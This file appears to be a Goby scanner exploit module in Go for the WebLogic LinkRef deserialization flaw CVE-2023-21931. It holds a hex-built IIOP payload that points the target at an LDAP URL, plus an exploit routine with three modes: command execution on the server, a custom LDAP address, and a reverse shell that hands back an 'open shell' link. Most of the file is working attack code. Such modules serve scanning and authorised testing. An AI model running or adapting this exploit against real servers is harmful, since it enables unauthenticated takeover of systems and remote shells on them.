package exploits

import (
	"encoding/binary"
	"encoding/hex"
	"errors"
	"fmt"
	"git.gobies.org/goby/goscanner/godclient"
	"git.gobies.org/goby/goscanner/goutils"
	"git.gobies.org/goby/goscanner/jsonvul"
	"git.gobies.org/goby/goscanner/jsonvul/protocols"
	"git.gobies.org/goby/goscanner/scanconfig"
	"git.gobies.org/goby/httpclient"
	"log"
	"net/url"
	"strings"
	"time"
)

func init() {
	expJson := `{
    "Name": "Weblogic LinkRef Deserialization Remote Code Execution Vulnerability (CVE-2023-21931)",
    "Description": "<p>WebLogic Server is one of the application server components for cloud and traditional environments.</p><p>There is a remote code execution vulnerability in WebLogic, which allows an unauthenticated attacker to access and damage the vulnerable WebLogic Server through the IIOP protocol network. Successful exploitation of the vulnerability can lead to WebLogic Server being taken over by the attacker, resulting in remote code execution.</p>",
    "Product": "Weblogic_interface_7001",
    "Homepage": "https://www.oracle.com/",
    "DisclosureDate": "2023-01-18",
    "Author": "992271865@qq.com",
    "FofaQuery": "(body=\"Welcome to WebLogic Server\")||(title==\"Error 404--Not Found\") || (((body=\"<h1>BEA WebLogic Server\" || server=\"Weblogic\" || body=\"content=\\\"WebLogic Server\" || body=\"<h1>Welcome to Weblogic Application\" || body=\"<h1>BEA WebLogic Server\") && header!=\"couchdb\" && header!=\"boa\" && header!=\"RouterOS\" && header!=\"X-Generator: Drupal\") || (banner=\"Weblogic\" && banner!=\"couchdb\" && banner!=\"drupal\" && banner!=\" Apache,Tomcat,Jboss\" && banner!=\"ReeCam IP Camera\" && banner!=\"<h2>Blog Comments</h2>\")) || (port=\"7001\" && protocol==\"weblogic\")",
    "GobyQuery": "(body=\"Welcome to WebLogic Server\")||(title==\"Error 404--Not Found\") || (((body=\"<h1>BEA WebLogic Server\" || server=\"Weblogic\" || body=\"content=\\\"WebLogic Server\" || body=\"<h1>Welcome to Weblogic Application\" || body=\"<h1>BEA WebLogic Server\") && header!=\"couchdb\" && header!=\"boa\" && header!=\"RouterOS\" && header!=\"X-Generator: Drupal\") || (banner=\"Weblogic\" && banner!=\"couchdb\" && banner!=\"drupal\" && banner!=\" Apache,Tomcat,Jboss\" && banner!=\"ReeCam IP Camera\" && banner!=\"<h2>Blog Comments</h2>\")) || (port=\"7001\" && protocol==\"weblogic\")",
    "Level": "3",
    "Impact": "<p>There is a remote code execution vulnerability in WebLogic, which allows an unauthenticated attacker to access and damage the vulnerable WebLogic Server through the IIOP protocol network. Successful exploitation of the vulnerability can lead to WebLogic Server being taken over by the attacker, resulting in remote code execution.</p>",
    "Recommendation": "<p>1. The manufacturer has not released an upgrade patch at present, please pay attention to the official website to download and update in time: <a href=\"https://www.oracle.com/\">https://www.oracle.com/</a></p><p>2. If it is not necessary, the public network is prohibited from accessing the system.</p>",
    "References": [],
    "Is0day": false,
    "HasExp": true,
    "ExpParams": [
        {
            "name": "attackMode",
            "type": "createSelect",
            "value": "cmd,ldap,reverse",
            "show": ""
        },
        {
            "name": "cmd",
            "type": "input",
            "value": "whoami",
            "show": "attackMode=cmd"
        },
        {
            "name": "ldap_addr",
            "type": "input",
            "value": "ldap://xxx.com/exp",
            "show": "attackMode=ldap"
        }
    ],
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "Tags": [
        "Code Execution",
        "2H1W"
    ],
    "VulType": [
        "Code Execution"
    ],
    "CVEIDs": [
        "CVE-2023-21931"
    ],
    "CNNVD": [
        "CNNVD-202208-3012"
    ],
    "CNVD": [
        "CNVD-2022-62388"
    ],
    "CVSSScore": "7.5",
    "Translation": {
        "CN": {
            "Name": "Weblogic LinkRef 反序列化远程代码执行漏洞（CVE-2023-21931）",
            "Product": "Weblogic_interface_7001",
            "Description": "<p>WebLogic Server是其中的一个适用于云环境和传统环境的应用服务器组件。</p><p>WebLogic 存在远程代码执行漏洞，该漏洞允许未经身份验证的攻击者通过IIOP协议网络访问并破坏易受攻击的WebLogic Server，成功的漏洞利用可导致WebLogic Server被攻击者接管，从而造成远程代码执行。</p>",
            "Recommendation": "<p>1、目前厂商未发布升级补丁，请关注官方网站及时下载更新：<a href=\"https://www.oracle.com/\">https://www.oracle.com/</a></p><p>2、如非必要，禁止公网访问该系统。</p>",
            "Impact": "<p>WebLogic 存在远程代码执行漏洞，该漏洞允许未经身份验证的攻击者通过IIOP协议网络访问并破坏易受攻击的WebLogic Server，成功的漏洞利用可导致WebLogic Server被攻击者接管，从而造成远程代码执行。<br></p>",
            "VulType": [
                "代码执行"
            ],
            "Tags": [
                "代码执行",
                "两高一弱"
            ]
        },
        "EN": {
            "Name": "Weblogic LinkRef Deserialization Remote Code Execution Vulnerability (CVE-2023-21931)",
            "Product": "Weblogic_interface_7001",
            "Description": "<p>WebLogic Server is one of the application server components for cloud and traditional environments.</p><p>There is a remote code execution vulnerability in WebLogic, which allows an unauthenticated attacker to access and damage the vulnerable WebLogic Server through the IIOP protocol network. Successful exploitation of the vulnerability can lead to WebLogic Server being taken over by the attacker, resulting in remote code execution.</p>",
            "Recommendation": "<p>1. The manufacturer has not released an upgrade patch at present, please pay attention to the official website to download and update in time: <a href=\"https://www.oracle.com/\">https://www.oracle.com/</a></p><p>2. If it is not necessary, the public network is prohibited from accessing the system.</p>",
            "Impact": "<p><span style=\"color: var(--primaryFont-color);\">There is a remote code execution vulnerability in WebLogic, which allows an unauthenticated attacker to access and damage the vulnerable WebLogic Server through the IIOP protocol network. Successful exploitation of the vulnerability can lead to WebLogic Server being taken over by the attacker, resulting in remote code execution.</span><br></p>",
            "VulType": [
                "Code Execution"
            ],
            "Tags": [
                "Code Execution",
                "2H1W"
            ]
        }
    },
    "AttackSurfaces": {
        "Application": null,
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "PocId": "9960"
}`
	getPayloadFlagMgG0 := func(ldapURL, bindName string) []byte {
		bindName = hex.EncodeToString([]byte(bindName))
		bindNameLengthHex := fmt.Sprintf("%x", len(bindName)/2)
		if len(bindName)/2 < 16 {
			bindNameLengthHex = "0" + bindNameLengthHex
		}
		length := make([]byte, 4)
		header := "00000001000000" + bindNameLengthHex + bindName + "0000000001000000000000001d0000001c000000000000000100000000000000010000000000000000000000007fffff020000003b524d493a6a617661782e6e616d696e672e4c696e6b5265663a344636333139443235464241393031333a4235343030443339384436303137394500007fffff0a00000037524d493a6a6176612e7574696c2e566563746f723a414537424231383643383442423736353a4439393737443542383033424146303100000000000c0101000000000000000000017fffff0a00000029524d493a5b4c6a6176612e6c616e672e4f626a6563743b3a3030303030303030303030303030303000000000000000680000000a0000001d0000005c0000000000000041524d493a6a617661782e6e616d696e672e537472696e67526566416464723a373032343839423237373039383530463a3834344246343343453131314443433900000000000000010000000000000000000000007fffff0a00000041524d493a6a617661782e6e616d696e672e537472696e67526566416464723a373032343839423237373039383530463a38343442463433434531313144434339000000007fffff0a0000002349444c3a6f6d672e6f72672f434f5242412f57537472696e6756616c75653a312e3000000000000f0000000b4c696e6b4164647265737300fffffffc7fffff0affffffffffffffb8"
		// ldap URL
		binary.BigEndian.PutUint32(length, uint32(len(ldapURL)+4))
		header += hex.EncodeToString(length)
		binary.BigEndian.PutUint32(length, uint32(len(ldapURL)))
		header += hex.EncodeToString(length)
		ldapURLHex := hex.EncodeToString([]byte(ldapURL))
		header += ldapURLHex
		var ldapURLPadding []byte
		if tmp0len := len(ldapURL) % 4; tmp0len != 0 {
			ldapURLPadding = make([]byte, 4-tmp0len)
		}
		header += hex.EncodeToString(ldapURLPadding)

		//header +=
		//总长度80原则
		args := len(ldapURL) % 4
		if args == 0 {
			args = 4
		}
		end := "fffffffd000002400000002000000031000000000000002349444c3a6f6d672e6f72672f434f5242412f4162737472616374426173653a312e3000000000000100000000000000000000002000000031000000000000002349444c3a6f6d672e6f72672f434f5242412f4162737472616374426173653a312e3000000000000100000000000000000000002000000031000000000000002349444c3a6f6d672e6f72672f434f5242412f4162737472616374426173653a312e3000000000000100000000000000000000002000000031000000000000002349444c3a6f6d672e6f72672f434f5242412f4162737472616374426173653a312e3000000000000100000000000000000000002000000031000000000000002349444c3a6f6d672e6f72672f434f5242412f4162737472616374426173653a312e3000000000000100000000000000000000002000000031000000000000002349444c3a6f6d672e6f72672f434f5242412f4162737472616374426173653a312e3000000000000100000000000000000000002000000031000000000000002349444c3a6f6d672e6f72672f434f5242412f4162737472616374426173653a312e3000000000000100000000000000000000002000000031000000000000002349444c3a6f6d672e6f72672f434f5242412f4162737472616374426173653a312e3000000000000100000000000000000000002000000031000000000000002349444c3a6f6d672e6f72672f434f5242412f4162737472616374426173653a312e300000000000010000000000000000ffffffff00000000000000007fffff02fffffffffffffd" + fmt.Sprintf("%x", 80-(len(ldapURL)+(4-args))) + "000000146a617661782e6e616d696e672e4c696e6b526566"

		data, _ := hex.DecodeString(header + end)
		return data
	}

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		func(exp *jsonvul.JsonVul, u *httpclient.FixUrl, ss *scanconfig.SingleScanConfig) bool {
			ldapToken := goutils.RandomHexString(4)
			bindName := goutils.RandomHexString(3)
			ldapURL, _ := godclient.GetGodLDAPCheckURL("U", ldapToken)
			if err := protocols.NewIIOP(u.HostInfo, func(iiop *protocols.IIOP) error {
				if _, err := iiop.Rebind(getPayloadFlagMgG0(ldapURL, bindName)); err != nil {
					return err
				}
				if _, err := iiop.Lookup(bindName); err != nil {
					return err
				}
				return nil
			}); err != nil {
				return false
			}
			return godclient.PullExists(ldapToken, 20*time.Second)
		},
		func(expResult *jsonvul.ExploitResult, stepLogs *scanconfig.SingleScanConfig) *jsonvul.ExploitResult {
			attackMode := goutils.B2S(stepLogs.Params["attackMode"])
			ldapURL := ""
			var waitSessionCh chan string
			if attackMode == "cmd" {
				// 执行命令
				ldapURL = "ldap://" + godclient.GetGodServerHost() + "/A3"
			} else if attackMode == "ldap" {
				// 执行自定义 LDAP
				ldapURL = goutils.B2S(stepLogs.Params["ldap_addr"])
			} else if attackMode == "reverse" {
				waitSessionCh = make(chan string)
				// 构建反弹Shell LDAP
				if rp, err := godclient.WaitSession("reverse_java", waitSessionCh); err != nil || len(rp) == 0 {
					log.Println("[WARNING] godclient bind failed", err)
					expResult.Output = err.Error()
					return expResult
				} else {
					ldapURL = "ldap://" + godclient.GetGodServerHost() + "/E" + godclient.GetKey() + rp
				}
			} else {
				expResult.Success = false
				expResult.Output = "未知的利用方式"
				return expResult
			}
			bindName := goutils.RandomHexString(3)
			if err := protocols.NewIIOP(expResult.HostInfo.HostInfo, func(iiop *protocols.IIOP) error {
				var stub []byte
				if attackMode == "cmd" {
					stub, _ = iiop.StubData("a61b225af2ba8df4e45e373ae0309b7b")
				}
				// 存根读取失败或者执行方式非等于cmd
				if stub == nil || len(stub) == 0 || attackMode != "cmd" {
					_, err := iiop.Rebind(getPayloadFlagMgG0(ldapURL, bindName))
					// rebind
					if _, err = iiop.Rebind(getPayloadFlagMgG0(ldapURL, bindName)); err != nil {
						return err
					}
					// lookup,反弹会占用连接导致超时
					if _, err = iiop.Lookup(bindName); err != nil && attackMode != "reverse" {
						return err
					}
				}
				if attackMode == "cmd" {
					if stub, err := iiop.StubData("a61b225af2ba8df4e45e373ae0309b7b"); err != nil {
						return err
					} else {
						if rsp, err := iiop.Exec(stub, goutils.B2S(stepLogs.Params["cmd"])); err != nil {
							return err
						} else {
							expResult.Success = true
							expResult.Output = rsp
							return nil
						}
					}
				} else if attackMode == "ldap" {
					expResult.Success = true
					expResult.Output = "Check LDAP Address : " + ldapURL + " ok!"
					return nil
				} else if attackMode == "reverse" {
					// 执行反弹
					// 执行reverse 检测
					select {
					case webConsoleID := <-waitSessionCh:
						if u, err := url.Parse(webConsoleID); err == nil {
							expResult.Success = true
							expResult.OutputType = "html"
							sid := strings.Join(u.Query()["id"], "")
							expResult.Output += `<br/> <a href="goby://sessions/view?sid=` + sid + `&key=` + godclient.GetKey() + `">open shell</a>`
							return nil
						}
					case <-time.After(time.Second * 10):
						return errors.New("反弹失败")
					}
				} else {
					expResult.Success = false
					return errors.New("未知的利用方式")
				}
				return nil
			}); err != nil {
				expResult.Success = false
				expResult.Output = err.Error()
				return expResult
			} else {
				return expResult
			}
		}))
}